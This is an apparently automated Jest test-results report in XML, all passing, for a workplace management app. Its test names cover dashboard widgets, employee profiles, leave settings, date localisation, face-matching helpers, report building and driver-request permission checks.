<?xml version="1.0" encoding="UTF-8"?>
<testsuites name="jest tests" tests="2306" failures="0" errors="0" time="41.53">
  <testsuite name="StrategyDashboardWidget" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="8.321" tests="23">
    <testcase classname="StrategyDashboardWidget returns null when strategySummary is undefined" name="StrategyDashboardWidget returns null when strategySummary is undefined" time="0.063">
    </testcase>
    <testcase classname="StrategyDashboardWidget returns null when strategy total is 0" name="StrategyDashboardWidget returns null when strategy total is 0" time="0.005">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders when strategy data exists" name="StrategyDashboardWidget renders when strategy data exists" time="0.169">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders total objective count" name="StrategyDashboardWidget renders total objective count" time="0.048">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders year in subtitle" name="StrategyDashboardWidget renders year in subtitle" time="0.031">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders company level count" name="StrategyDashboardWidget renders company level count" time="0.032">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders individual level count" name="StrategyDashboardWidget renders individual level count" time="0.032">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders average progress percentage" name="StrategyDashboardWidget renders average progress percentage" time="0.025">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders progress bar (custom div, not Progress component)" name="StrategyDashboardWidget renders progress bar (custom div, not Progress component)" time="0.02">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders on track count with fallback label" name="StrategyDashboardWidget renders on track count with fallback label" time="0.028">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders at risk count" name="StrategyDashboardWidget renders at risk count" time="0.037">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders behind count" name="StrategyDashboardWidget renders behind count" time="0.036">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders completed count" name="StrategyDashboardWidget renders completed count" time="0.034">
    </testcase>
    <testcase classname="StrategyDashboardWidget shows green progress (&gt;=70)" name="StrategyDashboardWidget shows green progress (&gt;=70)" time="0.024">
    </testcase>
    <testcase classname="StrategyDashboardWidget shows amber progress (40-69)" name="StrategyDashboardWidget shows amber progress (40-69)" time="0.028">
    </testcase>
    <testcase classname="StrategyDashboardWidget shows red progress (&lt;40)" name="StrategyDashboardWidget shows red progress (&lt;40)" time="0.027">
    </testcase>
    <testcase classname="StrategyDashboardWidget renders task stats section when data exists" name="StrategyDashboardWidget renders task stats section when data exists" time="0.03">
    </testcase>
    <testcase classname="StrategyDashboardWidget does not render task stats when taskStats is undefined" name="StrategyDashboardWidget does not render task stats when taskStats is undefined" time="0.029">
    </testcase>
    <testcase classname="StrategyDashboardWidget does not render task stats when totalLinked is 0" name="StrategyDashboardWidget does not render task stats when totalLinked is 0" time="0.021">
    </testcase>
    <testcase classname="StrategyDashboardWidget shows needs attention when issues exist" name="StrategyDashboardWidget shows needs attention when issues exist" time="0.023">
    </testcase>
    <testcase classname="StrategyDashboardWidget shows all good when no issues" name="StrategyDashboardWidget shows all good when no issues" time="0.017">
    </testcase>
    <testcase classname="StrategyDashboardWidget navigates to /strategy on view details click" name="StrategyDashboardWidget navigates to /strategy on view details click" time="0.033">
    </testcase>
    <testcase classname="StrategyDashboardWidget navigates to /goals on manage OKRs click" name="StrategyDashboardWidget navigates to /goals on manage OKRs click" time="0.018">
    </testcase>
  </testsuite>
  <testsuite name="QuickActions" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="8.591" tests="24">
    <testcase classname="QuickActions renders card title" name="QuickActions renders card title" time="0.146">
    </testcase>
    <testcase classname="QuickActions renders leave request action for employee" name="QuickActions renders leave request action for employee" time="0.054">
    </testcase>
    <testcase classname="QuickActions renders check-in action for employee" name="QuickActions renders check-in action for employee" time="0.032">
    </testcase>
    <testcase classname="QuickActions renders chat action for employee" name="QuickActions renders chat action for employee" time="0.029">
    </testcase>
    <testcase classname="QuickActions renders tasks action for employee" name="QuickActions renders tasks action for employee" time="0.032">
    </testcase>
    <testcase classname="QuickActions shows 4 common actions for employee role" name="QuickActions shows 4 common actions for employee role" time="0.202">
    </testcase>
    <testcase classname="QuickActions shows strategy action for admin" name="QuickActions shows strategy action for admin" time="0.047">
    </testcase>
    <testcase classname="QuickActions shows approvals action for admin" name="QuickActions shows approvals action for admin" time="0.06">
    </testcase>
    <testcase classname="QuickActions shows analytics action for admin" name="QuickActions shows analytics action for admin" time="0.045">
    </testcase>
    <testcase classname="QuickActions shows strategy action for supervisor" name="QuickActions shows strategy action for supervisor" time="0.04">
    </testcase>
    <testcase classname="QuickActions shows strategy action for superadmin" name="QuickActions shows strategy action for superadmin" time="0.041">
    </testcase>
    <testcase classname="QuickActions does not show strategy action for employee" name="QuickActions does not show strategy action for employee" time="0.032">
    </testcase>
    <testcase classname="QuickActions does not show approvals for employee" name="QuickActions does not show approvals for employee" time="0.021">
    </testcase>
    <testcase classname="QuickActions shows employees action for admin" name="QuickActions shows employees action for admin" time="0.027">
    </testcase>
    <testcase classname="QuickActions shows settings action for admin" name="QuickActions shows settings action for admin" time="0.026">
    </testcase>
    <testcase classname="QuickActions shows employees action for superadmin" name="QuickActions shows employees action for superadmin" time="0.036">
    </testcase>
    <testcase classname="QuickActions does not show employees action for employee" name="QuickActions does not show employees action for employee" time="0.026">
    </testcase>
    <testcase classname="QuickActions does not show employees action for supervisor" name="QuickActions does not show employees action for supervisor" time="0.024">
    </testcase>
    <testcase classname="QuickActions shows 9 actions for admin (4 common + 3 manager + 2 admin)" name="QuickActions shows 9 actions for admin (4 common + 3 manager + 2 admin)" time="0.094">
    </testcase>
    <testcase classname="QuickActions shows 7 actions for supervisor (4 common + 3 manager)" name="QuickActions shows 7 actions for supervisor (4 common + 3 manager)" time="0.052">
    </testcase>
    <testcase classname="QuickActions shows 9 actions for superadmin (4 common + 3 manager + 2 admin)" name="QuickActions shows 9 actions for superadmin (4 common + 3 manager + 2 admin)" time="0.07">
    </testcase>
    <testcase classname="QuickActions navigates to /leaves when leave request clicked" name="QuickActions navigates to /leaves when leave request clicked" time="0.067">
    </testcase>
    <testcase classname="QuickActions navigates to /attendance when check-in clicked" name="QuickActions navigates to /attendance when check-in clicked" time="0.019">
    </testcase>
    <testcase classname="QuickActions navigates to /strategy when strategy clicked (admin)" name="QuickActions navigates to /strategy when strategy clicked (admin)" time="0.042">
    </testcase>
  </testsuite>
  <testsuite name="EmployeeProfileDetail" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="8.992" tests="26">
    <testcase classname="EmployeeProfileDetail Loading state shows loading text when employee is undefined" name="EmployeeProfileDetail Loading state shows loading text when employee is undefined" time="0.137">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders employee name" name="EmployeeProfileDetail Employee header renders employee name" time="0.076">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders employee position" name="EmployeeProfileDetail Employee header renders employee position" time="0.066">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders role, type, and status badges" name="EmployeeProfileDetail Employee header renders role, type, and status badges" time="0.034">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders employee email" name="EmployeeProfileDetail Employee header renders employee email" time="0.026">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders employee phone" name="EmployeeProfileDetail Employee header renders employee phone" time="0.019">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders department" name="EmployeeProfileDetail Employee header renders department" time="0.026">
    </testcase>
    <testcase classname="EmployeeProfileDetail Employee header renders AI score when available" name="EmployeeProfileDetail Employee header renders AI score when available" time="0.087">
    </testcase>
    <testcase classname="EmployeeProfileDetail Superadmin permissions shows rating button for admin/supervisor" name="EmployeeProfileDetail Superadmin permissions shows rating button for admin/supervisor" time="0.05">
    </testcase>
    <testcase classname="EmployeeProfileDetail Attendance stats renders attendance stats" name="EmployeeProfileDetail Attendance stats renders attendance stats" time="0.024">
    </testcase>
    <testcase classname="EmployeeProfileDetail Attendance stats shows alert when late days &gt; 0" name="EmployeeProfileDetail Attendance stats shows alert when late days &gt; 0" time="0.044">
    </testcase>
    <testcase classname="EmployeeProfileDetail Performance rating renders latest rating card" name="EmployeeProfileDetail Performance rating renders latest rating card" time="0.066">
    </testcase>
    <testcase classname="EmployeeProfileDetail Performance rating renders strengths section" name="EmployeeProfileDetail Performance rating renders strengths section" time="0.054">
    </testcase>
    <testcase classname="EmployeeProfileDetail Performance rating renders areas for improvement" name="EmployeeProfileDetail Performance rating renders areas for improvement" time="0.055">
    </testcase>
    <testcase classname="EmployeeProfileDetail Performance rating renders general comments" name="EmployeeProfileDetail Performance rating renders general comments" time="0.041">
    </testcase>
    <testcase classname="EmployeeProfileDetail Leave balances renders leave balances" name="EmployeeProfileDetail Leave balances renders leave balances" time="0.021">
    </testcase>
    <testcase classname="EmployeeProfileDetail AI performance breakdown renders performance breakdown scores" name="EmployeeProfileDetail AI performance breakdown renders performance breakdown scores" time="0.031">
    </testcase>
    <testcase classname="EmployeeProfileDetail Identity / biography / documents renders passport number from profile" name="EmployeeProfileDetail Identity / biography / documents renders passport number from profile" time="0.034">
    </testcase>
    <testcase classname="EmployeeProfileDetail Identity / biography / documents renders nationality from profile" name="EmployeeProfileDetail Identity / biography / documents renders nationality from profile" time="0.031">
    </testcase>
    <testcase classname="EmployeeProfileDetail Identity / biography / documents renders skills from biography" name="EmployeeProfileDetail Identity / biography / documents renders skills from biography" time="0.033">
    </testcase>
    <testcase classname="EmployeeProfileDetail Identity / biography / documents renders languages from biography" name="EmployeeProfileDetail Identity / biography / documents renders languages from biography" time="0.037">
    </testcase>
    <testcase classname="EmployeeProfileDetail Identity / biography / documents renders documents section" name="EmployeeProfileDetail Identity / biography / documents renders documents section" time="0.036">
    </testcase>
    <testcase classname="EmployeeProfileDetail No rating state shows add first rating button when latestRating is null" name="EmployeeProfileDetail No rating state shows add first rating button when latestRating is null" time="0.027">
    </testcase>
    <testcase classname="EmployeeProfileDetail No rating state opens rating form when add first rating is clicked" name="EmployeeProfileDetail No rating state opens rating form when add first rating is clicked" time="0.084">
    </testcase>
    <testcase classname="EmployeeProfileDetail Supervisor rating form toggles rating form on rate button click" name="EmployeeProfileDetail Supervisor rating form toggles rating form on rate button click" time="0.055">
    </testcase>
    <testcase classname="EmployeeProfileDetail Edit modal opens edit modal on edit button click" name="EmployeeProfileDetail Edit modal opens edit modal on edit button click" time="0.035">
    </testcase>
  </testsuite>
  <testsuite name="LeaveSettingsPage" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="9.18" tests="19">
    <testcase classname="LeaveSettingsPage renders the page title" name="LeaveSettingsPage renders the page title" time="0.214">
    </testcase>
    <testcase classname="LeaveSettingsPage renders the subtitle" name="LeaveSettingsPage renders the subtitle" time="0.064">
    </testcase>
    <testcase classname="LeaveSettingsPage renders all 9 leave type cards" name="LeaveSettingsPage renders all 9 leave type cards" time="0.07">
    </testcase>
    <testcase classname="LeaveSettingsPage shows active badge for enabled leave types" name="LeaveSettingsPage shows active badge for enabled leave types" time="0.086">
    </testcase>
    <testcase classname="LeaveSettingsPage shows inactive badge for disabled leave types" name="LeaveSettingsPage shows inactive badge for disabled leave types" time="0.054">
    </testcase>
    <testcase classname="LeaveSettingsPage shows ShieldLoader when no organization" name="LeaveSettingsPage shows ShieldLoader when no organization" time="0.002">
    </testcase>
    <testcase classname="LeaveSettingsPage shows ShieldLoader when no user" name="LeaveSettingsPage shows ShieldLoader when no user" time="0.008">
    </testcase>
    <testcase classname="LeaveSettingsPage shows leave type names for all types" name="LeaveSettingsPage shows leave type names for all types" time="0.095">
    </testcase>
    <testcase classname="LeaveSettingsPage shows edit button for each leave type" name="LeaveSettingsPage shows edit button for each leave type" time="0.042">
    </testcase>
    <testcase classname="LeaveSettingsPage expands editing form when edit is clicked" name="LeaveSettingsPage expands editing form when edit is clicked" time="0.303">
    </testcase>
    <testcase classname="LeaveSettingsPage shows approval chain badges when editing" name="LeaveSettingsPage shows approval chain badges when editing" time="0.118">
    </testcase>
    <testcase classname="LeaveSettingsPage shows save and cancel buttons when editing" name="LeaveSettingsPage shows save and cancel buttons when editing" time="0.088">
    </testcase>
    <testcase classname="LeaveSettingsPage calls upsertConfig on save" name="LeaveSettingsPage calls upsertConfig on save" time="0.111">
    </testcase>
    <testcase classname="LeaveSettingsPage shows default days info when config exists" name="LeaveSettingsPage shows default days info when config exists" time="0.04">
    </testcase>
    <testcase classname="LeaveSettingsPage shows approval chain in card description" name="LeaveSettingsPage shows approval chain in card description" time="0.038">
    </testcase>
    <testcase classname="LeaveSettingsPage renders icons for each leave type" name="LeaveSettingsPage renders icons for each leave type" time="0.043">
    </testcase>
    <testcase classname="LeaveSettingsPage applies opacity for inactive leave types" name="LeaveSettingsPage applies opacity for inactive leave types" time="0.042">
    </testcase>
    <testcase classname="LeaveSettingsPage closes edit form on cancel" name="LeaveSettingsPage closes edit form on cancel" time="0.127">
    </testcase>
    <testcase classname="LeaveSettingsPage toggles isActive switch when editing" name="LeaveSettingsPage toggles isActive switch when editing" time="0.131">
    </testcase>
  </testsuite>
  <testsuite name="getLocaleString" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="11.428" tests="56">
    <testcase classname="getLocaleString returns en-US for undefined lang" name="getLocaleString returns en-US for undefined lang" time="0.014">
    </testcase>
    <testcase classname="getLocaleString returns correct Intl locale for each supported language" name="getLocaleString returns correct Intl locale for each supported language" time="0.002">
    </testcase>
    <testcase classname="getLocaleString falls back to en-US for unknown locale" name="getLocaleString falls back to en-US for unknown locale" time="0.001">
    </testcase>
    <testcase classname="getLocaleString returns en-US for empty string" name="getLocaleString returns en-US for empty string" time="0.001">
    </testcase>
    <testcase classname="formatDate formats date with default options" name="formatDate formats date with default options" time="0.061">
    </testcase>
    <testcase classname="formatDate formats date with long month option" name="formatDate formats date with long month option" time="0.003">
    </testcase>
    <testcase classname="formatDate formats date with short month option" name="formatDate formats date with short month option" time="0.001">
    </testcase>
    <testcase classname="formatDate formats date with month year option" name="formatDate formats date with month year option" time="0.001">
    </testcase>
    <testcase classname="formatDate accepts string date input" name="formatDate accepts string date input" time="0.001">
    </testcase>
    <testcase classname="formatDate accepts number timestamp input" name="formatDate accepts number timestamp input" time="0.002">
    </testcase>
    <testcase classname="formatDate falls back to Intl for unsupported format options" name="formatDate falls back to Intl for unsupported format options" time="0.003">
    </testcase>
    <testcase classname="formatDate handles Russian locale" name="formatDate handles Russian locale" time="0.001">
    </testcase>
    <testcase classname="formatDate handles Armenian locale" name="formatDate handles Armenian locale" time="0.001">
    </testcase>
    <testcase classname="formatDateTime formats date and time" name="formatDateTime formats date and time" time="0.004">
    </testcase>
    <testcase classname="formatDateTime accepts number input" name="formatDateTime accepts number input" time="0.001">
    </testcase>
    <testcase classname="formatDateTime accepts string input" name="formatDateTime accepts string input" time="0.001">
    </testcase>
    <testcase classname="formatDateTime handles Russian locale" name="formatDateTime handles Russian locale" time="0.002">
    </testcase>
    <testcase classname="formatDateTime handles custom options" name="formatDateTime handles custom options" time="0.001">
    </testcase>
    <testcase classname="formatTime formats time" name="formatTime formats time" time="0.003">
    </testcase>
    <testcase classname="formatTime accepts number input" name="formatTime accepts number input" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime formats &quot;in X seconds&quot; for recent future" name="formatRelativeTime formats &quot;in X seconds&quot; for recent future" time="0.002">
    </testcase>
    <testcase classname="formatRelativeTime formats &quot;in X minutes&quot; for near future" name="formatRelativeTime formats &quot;in X minutes&quot; for near future" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime formats &quot;in X hours&quot; for future hours" name="formatRelativeTime formats &quot;in X hours&quot; for future hours" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime formats &quot;in X days&quot; for future days" name="formatRelativeTime formats &quot;in X days&quot; for future days" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime formats past dates" name="formatRelativeTime formats past dates" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime handles numeric input" name="formatRelativeTime handles numeric input" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime handles string input" name="formatRelativeTime handles string input" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames returns 7 weekday names" name="getWeekdayNames returns 7 weekday names" time="0.002">
    </testcase>
    <testcase classname="getWeekdayNames returns long weekday names" name="getWeekdayNames returns long weekday names" time="0.002">
    </testcase>
    <testcase classname="getWeekdayNames returns narrow weekday names" name="getWeekdayNames returns narrow weekday names" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames handles Russian locale" name="getWeekdayNames handles Russian locale" time="0.002">
    </testcase>
    <testcase classname="getMonthNames returns 12 month names" name="getMonthNames returns 12 month names" time="0.001">
    </testcase>
    <testcase classname="getMonthNames returns short month names" name="getMonthNames returns short month names" time="0.001">
    </testcase>
    <testcase classname="getMonthNames returns narrow month names" name="getMonthNames returns narrow month names" time="0.001">
    </testcase>
    <testcase classname="getMonthNames defaults to long format" name="getMonthNames defaults to long format" time="0.002">
    </testcase>
    <testcase classname="getMonthNames handles Russian locale" name="getMonthNames handles Russian locale" time="0.001">
    </testcase>
    <testcase classname="formatDate - all locales locale en format long" name="formatDate - all locales locale en format long" time="0.001">
    </testcase>
    <testcase classname="formatDate - all locales locale en format short" name="formatDate - all locales locale en format short" time="0">
    </testcase>
    <testcase classname="formatDate - all locales locale ru format long" name="formatDate - all locales locale ru format long" time="0">
    </testcase>
    <testcase classname="formatDate - all locales locale ru format short" name="formatDate - all locales locale ru format short" time="0">
    </testcase>
    <testcase classname="formatDate - all locales locale de format long" name="formatDate - all locales locale de format long" time="0.001">
    </testcase>
    <testcase classname="formatDate - all locales locale de format short" name="formatDate - all locales locale de format short" time="0.001">
    </testcase>
    <testcase classname="formatDate - all locales locale hy format long" name="formatDate - all locales locale hy format long" time="0.001">
    </testcase>
    <testcase classname="formatDate - all locales locale hy format short" name="formatDate - all locales locale hy format short" time="0.001">
    </testcase>
    <testcase classname="formatDate - edge cases handles epoch" name="formatDate - edge cases handles epoch" time="0.001">
    </testcase>
    <testcase classname="formatDate - edge cases handles future dates" name="formatDate - edge cases handles future dates" time="0.001">
    </testcase>
    <testcase classname="formatDate - edge cases handles leap year" name="formatDate - edge cases handles leap year" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime - edge cases handles exact now" name="formatRelativeTime - edge cases handles exact now" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime - edge cases handles 1 second ago" name="formatRelativeTime - edge cases handles 1 second ago" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime - edge cases handles 1 minute ago" name="formatRelativeTime - edge cases handles 1 minute ago" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime - edge cases handles 1 hour ago" name="formatRelativeTime - edge cases handles 1 hour ago" time="0.001">
    </testcase>
    <testcase classname="formatRelativeTime - edge cases handles 1 day ago" name="formatRelativeTime - edge cases handles 1 day ago" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames - all locales locale en has 7 weekdays" name="getWeekdayNames - all locales locale en has 7 weekdays" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames - all locales locale ru has 7 weekdays" name="getWeekdayNames - all locales locale ru has 7 weekdays" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames - all locales locale de has 7 weekdays" name="getWeekdayNames - all locales locale de has 7 weekdays" time="0.001">
    </testcase>
    <testcase classname="getWeekdayNames - all locales locale hy has 7 weekdays" name="getWeekdayNames - all locales locale hy has 7 weekdays" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="detectFace" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:35" time="11.778" tests="12">
    <testcase classname="detectFace returns null for invalid video element (not ready)" name="detectFace returns null for invalid video element (not ready)" time="5.136">
    </testcase>
    <testcase classname="detectFace returns detection result for valid video" name="detectFace returns detection result for valid video" time="0.006">
    </testcase>
    <testcase classname="detectFace returns null on error" name="detectFace returns null on error" time="0.002">
    </testcase>
    <testcase classname="compareFaces calls euclideanDistance and returns number" name="compareFaces calls euclideanDistance and returns number" time="0.002">
    </testcase>
    <testcase classname="isFaceMatch returns true when distance is below threshold" name="isFaceMatch returns true when distance is below threshold" time="0.001">
    </testcase>
    <testcase classname="isFaceMatch returns false when distance equals or exceeds threshold" name="isFaceMatch returns false when distance equals or exceeds threshold" time="0.001">
    </testcase>
    <testcase classname="isFaceMatch uses default threshold of 0.6" name="isFaceMatch uses default threshold of 0.6" time="0.001">
    </testcase>
    <testcase classname="findBestMatch returns the closest match from known descriptors" name="findBestMatch returns the closest match from known descriptors" time="0.002">
    </testcase>
    <testcase classname="findBestMatch returns null for empty known descriptors" name="findBestMatch returns null for empty known descriptors" time="0.001">
    </testcase>
    <testcase classname="createCanvasFromVideo creates a canvas matching video dimensions" name="createCanvasFromVideo creates a canvas matching video dimensions" time="0.003">
    </testcase>
    <testcase classname="canvasToBlob resolves with blob on success" name="canvasToBlob resolves with blob on success" time="0.003">
    </testcase>
    <testcase classname="canvasToBlob rejects when toBlob returns null" name="canvasToBlob rejects when toBlob returns null" time="0.074">
    </testcase>
  </testsuite>
  <testsuite name="AIGovernancePanel" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:34" time="13.038" tests="6">
    <testcase classname="AIGovernancePanel renders without crashing while data is loading" name="AIGovernancePanel renders without crashing while data is loading" time="0.16">
    </testcase>
    <testcase classname="AIGovernancePanel renders the overview tab by default" name="AIGovernancePanel renders the overview tab by default" time="0.078">
    </testcase>
    <testcase classname="AIGovernancePanel renders all 5 tab buttons" name="AIGovernancePanel renders all 5 tab buttons" time="0.063">
    </testcase>
    <testcase classname="AIGovernancePanel shows placeholder stats before data loads" name="AIGovernancePanel shows placeholder stats before data loads" time="0.038">
    </testcase>
    <testcase classname="AIGovernancePanel renders real stats from the query result" name="AIGovernancePanel renders real stats from the query result" time="0.102">
    </testcase>
    <testcase classname="AIGovernancePanel shows empty-state when there is no AI activity" name="AIGovernancePanel shows empty-state when there is no AI activity" time="0.06">
    </testcase>
  </testsuite>
  <testsuite name="ReportBuilder" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:43" time="4.78" tests="25">
    <testcase classname="ReportBuilder Header &amp; Layout renders report name input" name="ReportBuilder Header &amp; Layout renders report name input" time="0.101">
    </testcase>
    <testcase classname="ReportBuilder Header &amp; Layout shows widget count" name="ReportBuilder Header &amp; Layout shows widget count" time="0.051">
    </testcase>
    <testcase classname="ReportBuilder Header &amp; Layout renders action buttons" name="ReportBuilder Header &amp; Layout renders action buttons" time="0.056">
    </testcase>
    <testcase classname="ReportBuilder Report Name allows editing report name" name="ReportBuilder Report Name allows editing report name" time="0.08">
    </testcase>
    <testcase classname="ReportBuilder Toolbar renders Add Widget buttons" name="ReportBuilder Toolbar renders Add Widget buttons" time="0.048">
    </testcase>
    <testcase classname="ReportBuilder Toolbar renders auto-refresh switch" name="ReportBuilder Toolbar renders auto-refresh switch" time="0.109">
    </testcase>
    <testcase classname="ReportBuilder Toolbar renders time range selector" name="ReportBuilder Toolbar renders time range selector" time="0.042">
    </testcase>
    <testcase classname="ReportBuilder Widget Management starts with one default widget" name="ReportBuilder Widget Management starts with one default widget" time="0.053">
    </testcase>
    <testcase classname="ReportBuilder Widget Management adds a new widget on click" name="ReportBuilder Widget Management adds a new widget on click" time="0.119">
    </testcase>
    <testcase classname="ReportBuilder Widget Management removes a widget and reduces count" name="ReportBuilder Widget Management removes a widget and reduces count" time="0.134">
    </testcase>
    <testcase classname="ReportBuilder Widget Management selects a widget on click" name="ReportBuilder Widget Management selects a widget on click" time="0.122">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows widget title input when selected" name="ReportBuilder Widget Settings shows widget title input when selected" time="0.097">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows chart type options when selected" name="ReportBuilder Widget Settings shows chart type options when selected" time="0.124">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows metric selector when selected" name="ReportBuilder Widget Settings shows metric selector when selected" time="0.109">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows period selector when selected" name="ReportBuilder Widget Settings shows period selector when selected" time="0.116">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows group by selector when selected" name="ReportBuilder Widget Settings shows group by selector when selected" time="0.125">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings shows color picker when selected" name="ReportBuilder Widget Settings shows color picker when selected" time="0.116">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings updates widget title" name="ReportBuilder Widget Settings updates widget title" time="0.136">
    </testcase>
    <testcase classname="ReportBuilder Widget Settings changes chart type on click" name="ReportBuilder Widget Settings changes chart type on click" time="0.14">
    </testcase>
    <testcase classname="ReportBuilder Preview Mode toggles to preview mode" name="ReportBuilder Preview Mode toggles to preview mode" time="0.065">
    </testcase>
    <testcase classname="ReportBuilder Preview Mode shows widget title and metric badge in preview mode" name="ReportBuilder Preview Mode shows widget title and metric badge in preview mode" time="0.069">
    </testcase>
    <testcase classname="ReportBuilder Preview Mode shows chart component in preview mode" name="ReportBuilder Preview Mode shows chart component in preview mode" time="0.069">
    </testcase>
    <testcase classname="ReportBuilder Empty State shows no widget selected message when no widget is selected in edit mode" name="ReportBuilder Empty State shows no widget selected message when no widget is selected in edit mode" time="0.039">
    </testcase>
    <testcase classname="ReportBuilder Empty State shows chart type badges in empty state" name="ReportBuilder Empty State shows chart type badges in empty state" time="0.047">
    </testcase>
    <testcase classname="ReportBuilder Auto-Refresh Toggle toggles auto-refresh off" name="ReportBuilder Auto-Refresh Toggle toggles auto-refresh off" time="0.084">
    </testcase>
  </testsuite>
  <testsuite name="drivers.respondToDriverRequest" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:44" time="4.053" tests="46">
    <testcase classname="drivers.respondToDriverRequest rejects unauthenticated caller" name="drivers.respondToDriverRequest rejects unauthenticated caller" time="0.066">
    </testcase>
    <testcase classname="drivers.respondToDriverRequest rejects when request.driverId does not match args.driverId" name="drivers.respondToDriverRequest rejects when request.driverId does not match args.driverId" time="0.002">
    </testcase>
    <testcase classname="drivers.respondToDriverRequest rejects when caller is not the driver" name="drivers.respondToDriverRequest rejects when caller is not the driver" time="0.001">
    </testcase>
    <testcase classname="drivers.respondToDriverRequest approves request and creates schedule for the driver" name="drivers.respondToDriverRequest approves request and creates schedule for the driver" time="0.006">
    </testcase>
    <testcase classname="drivers.respondToDriverRequest declines request without creating schedule" name="drivers.respondToDriverRequest declines request without creating schedule" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverRequest rejects unauthenticated caller" name="drivers.updateDriverRequest rejects unauthenticated caller" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverRequest rejects non-requester, non-admin caller" name="drivers.updateDriverRequest rejects non-requester, non-admin caller" time="0.002">
    </testcase>
    <testcase classname="drivers.updateDriverRequest allows requester to update their pending request" name="drivers.updateDriverRequest allows requester to update their pending request" time="0.001">
    </testcase>
    <testcase classname="drivers.updateDriverRequest allows admin to update any request" name="drivers.updateDriverRequest allows admin to update any request" time="0.001">
    </testcase>
    <testcase classname="drivers.updateDriverRequest throws when editing cancelled request" name="drivers.updateDriverRequest throws when editing cancelled request" time="0.002">
    </testcase>
    <testcase classname="drivers.cancelDriverRequest rejects unauthenticated caller" name="drivers.cancelDriverRequest rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.cancelDriverRequest rejects non-requester caller" name="drivers.cancelDriverRequest rejects non-requester caller" time="0.024">
    </testcase>
    <testcase classname="drivers.cancelDriverRequest cancels request for the requester" name="drivers.cancelDriverRequest cancels request for the requester" time="0.001">
    </testcase>
    <testcase classname="drivers.deleteDriverRequest rejects unauthenticated caller" name="drivers.deleteDriverRequest rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.deleteDriverRequest rejects non-requester, non-admin caller" name="drivers.deleteDriverRequest rejects non-requester, non-admin caller" time="0.001">
    </testcase>
    <testcase classname="drivers.deleteDriverRequest allows requester to delete their request" name="drivers.deleteDriverRequest allows requester to delete their request" time="0.001">
    </testcase>
    <testcase classname="drivers.deleteDriverRequest allows superadmin to delete any request" name="drivers.deleteDriverRequest allows superadmin to delete any request" time="0.001">
    </testcase>
    <testcase classname="drivers.reassignDriverRequest rejects unauthenticated caller" name="drivers.reassignDriverRequest rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.reassignDriverRequest rejects non-requester caller" name="drivers.reassignDriverRequest rejects non-requester caller" time="0.001">
    </testcase>
    <testcase classname="drivers.reassignDriverRequest rejects reassignment of non-declined requests" name="drivers.reassignDriverRequest rejects reassignment of non-declined requests" time="0.001">
    </testcase>
    <testcase classname="drivers.reassignDriverRequest reassigns declined request to new driver" name="drivers.reassignDriverRequest reassigns declined request to new driver" time="0.001">
    </testcase>
    <testcase classname="drivers.reassignDriverRequest throws when new driver has overlapping schedule" name="drivers.reassignDriverRequest throws when new driver has overlapping schedule" time="0.001">
    </testcase>
    <testcase classname="drivers.grantCalendarAccess rejects unauthenticated caller" name="drivers.grantCalendarAccess rejects unauthenticated caller" time="0.005">
    </testcase>
    <testcase classname="drivers.grantCalendarAccess creates new calendar access entry for caller as owner" name="drivers.grantCalendarAccess creates new calendar access entry for caller as owner" time="0.001">
    </testcase>
    <testcase classname="drivers.grantCalendarAccess updates existing calendar access entry" name="drivers.grantCalendarAccess updates existing calendar access entry" time="0.001">
    </testcase>
    <testcase classname="drivers.revokeCalendarAccess rejects unauthenticated caller" name="drivers.revokeCalendarAccess rejects unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="drivers.revokeCalendarAccess rejects non-owner caller" name="drivers.revokeCalendarAccess rejects non-owner caller" time="0.001">
